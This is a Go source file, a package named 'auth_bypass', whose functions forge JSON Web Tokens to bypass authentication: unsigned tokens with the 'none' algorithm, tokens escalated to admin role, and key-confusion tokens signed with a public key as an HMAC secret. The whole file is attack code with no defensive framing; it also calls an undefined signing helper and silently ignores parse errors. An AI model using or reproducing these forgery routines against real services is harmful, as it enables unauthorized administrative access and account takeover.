package auth_bypass

import (
"encoding/base64"
"encoding/json"
"strings"
)

type JWTHeader struct {
Alg string `json:"alg"`
Typ string `json:"typ"`
}

type JWTPayload struct {
Sub   string `json:"sub"`
Role  string `json:"role"`
Admin bool   `json:"admin"`
}

func ParseJWT(token string) (JWTHeader, JWTPayload, error) {
parts := strings.Split(token, ".")
if len(parts) < 3 {
return JWTHeader{}, JWTPayload{}, nil
}
headerBytes, _ := base64.RawURLEncoding.DecodeString(parts[0])
payloadBytes, _ := base64.RawURLEncoding.DecodeString(parts[1])
var header JWTHeader
var payload JWTPayload
json.Unmarshal(headerBytes, &header)
json.Unmarshal(payloadBytes, &payload)
return header, payload, nil
}

func ForgeJWTWithAlgNone(payload JWTPayload) (string, error) {
header := JWTHeader{
Alg: "none",
Typ: "JWT",
}
headerBytes, _ := json.Marshal(header)
payloadBytes, _ := json.Marshal(payload)
return base64.RawURLEncoding.EncodeToString(headerBytes) + "." + base64.RawURLEncoding.EncodeToString(payloadBytes) + ".", nil
}

func ForgeJWTWithRoleEscalation(payload JWTPayload) (string, error) {
payload.Role = "admin"
payload.Admin = true
return ForgeJWTWithAlgNone(payload)
}

func ForgeJWTWithKeyConfusion(payload JWTPayload, publicKey string) (string, error) {
header := JWTHeader{
Alg: "HS256",
Typ: "JWT",
}
headerBytes, _ := json.Marshal(header)
payloadBytes, _ := json.Marshal(payload)
signingInput := base64.RawURLEncoding.EncodeToString(headerBytes) + "." + base64.RawURLEncoding.EncodeToString(payloadBytes)
signature := HMACSign([]byte(publicKey), signingInput)
return signingInput + "." + signature, nil
}

func ForgeJWTWithAlgorithmNone(payload JWTPayload) (string, error) {
return ForgeJWTWithAlgNone(payload)
}

func SplitToken(token string) (string, string, string) {
parts := strings.Split(token, ".")
if len(parts) < 3 {
return "", "", ""
}
return parts[0], parts[1], parts[2]
}
